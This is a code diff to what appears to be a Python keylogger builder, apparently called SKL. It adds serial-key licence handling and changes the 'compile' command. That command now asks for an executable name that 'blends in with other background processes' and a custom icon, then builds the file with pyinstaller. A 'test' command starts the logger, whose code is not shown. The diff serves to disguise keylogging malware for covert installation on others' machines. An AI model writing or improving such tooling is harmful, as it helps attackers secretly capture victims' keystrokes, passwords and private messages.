@@ -78,8 +78,16 @@ def license():
             if serial[0] == "J" and serial[6] == "S" and serial[12] == "K" and serial[19] == "V" and serial[26] == "I" and serial[32] == "B" and serial[38] == "U":
                 os.system("cls")
                 return
+            else:
+                serial = input("Serial key: ")
+                with open(f"{path}/serial.json","w") as r:
+                    serialJSON = {"serial": serial}
+                    json.dump(serialJSON,r)
         except:
-            print()
+            serial = input("Serial key: ")
+            with open(f"{path}/serial.json","w") as r:
+                serialJSON = {"serial": serial}
+                json.dump(serialJSON,r)
              
             
     except:
@@ -344,10 +352,17 @@ def __main__():
 
     elif CONSOLE.lower() == "compile":
         try:
-          
-           os.system("pyinstaller --onefile SKL.py")
+            print(bcolors.WARNING + "Please enter a name for your .exe file." + bcolors.DIM + "\nMake sure it blends in with other background processes (do not use spaces)." + bcolors.RESET_DIM)
+            filename = input(bcolors.OKBLUE + "filename: " + bcolors.WHITE)
+            os.system("cls")
+            printlogo()
+            print(bcolors.WARNING + "Enter the file path of a logo" + bcolors.DIM + "\nIf you dont have a logo, just type NONE." + bcolors.RESET_DIM)
+            logo = input(bcolors.OKBLUE + "filename: " + bcolors.WHITE)
+            os.rename("SKL.py", filename + ".py")
+            os.system(f"pyinstaller -F  \"{filename}\".py -i {logo}")
+            os.rename(f"{filename}.py", "SKL.py")
         except:
-            print(bcolors.FAIL + "Failed to compile KeyLogger.")
+            print(bcolors.FAIL + "Failed to compile KeyLogger properly.")
     elif CONSOLE.lower() == "test":
         try:
             START_LOGGER()
@@ -373,6 +388,7 @@ printlogo()
 __main__()
 
 print(bcolors.WHITE)
+
 
 
 
